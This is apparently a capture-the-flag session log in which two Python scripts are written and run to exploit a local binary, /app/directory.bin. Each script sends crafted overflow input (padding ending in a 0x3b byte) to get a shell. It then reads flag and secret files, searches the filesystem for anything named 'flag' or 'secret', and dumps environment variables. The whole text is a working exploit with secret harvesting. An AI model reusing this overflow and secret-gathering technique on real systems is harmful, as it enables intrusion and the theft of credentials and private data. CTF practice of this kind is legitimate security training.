cat << 'EOF' > /tmp/run.py
import subprocess, time, sys

p = subprocess.Popen(['/app/directory.bin'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

for i in range(9):
    p.stdin.write(b"1B\n")
    p.stdin.flush()
    time.sleep(0.05)

p.stdin.write(b"1" + b"B" + b"A"*38 + b"\x3b")
p.stdin.flush()
time.sleep(0.05)

p.stdin.write(b"4\n")
p.stdin.flush()
time.sleep(0.05)

p.stdin.write(b"echo EXPLOIT_SUCCESS\n")
p.stdin.write(b"cat /flag.txt /flag /app/flag.txt /root/flag.txt /secret 2>/dev/null\n")
p.stdin.write(b"find / -name '*flag*' -o -name '*secret*' 2>/dev/null\n")
p.stdin.write(b"env\n")
p.stdin.write(b"exit\n")
p.stdin.flush()
time.sleep(1)

out = p.stdout.read()
sys.stdout.buffer.write(out)
EOF
python3 /tmp/run.py
cat << 'EOF' > /tmp/perfect.py
import subprocess, time, sys

p = subprocess.Popen(['/app/directory.bin'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def send(data):
    p.stdin.write(data)
    p.stdin.flush()
    time.sleep(0.1)

for i in range(9):
    send(b"1\n")
    send(b"A\n")

send(b"1\n")
send(b"A"*32 + b"B"*8 + b"\x3b")

send(b"4\n")

send(b"echo EXPLOIT_SUCCESS\n")
send(b"whoami\n")
send(b"ls -la /\n")
send(b"find / -name '*flag*' -o -name '*secret*' 2>/dev/null\n")
# Sometimes the original CTF secret is passed in a hidden file
send(b"cat /flag 2>/dev/null\n")
send(b"exit\n")

time.sleep(1)
print(p.stdout.read().decode('latin1', errors='ignore'))
EOF
python3 /tmp/perfect.py
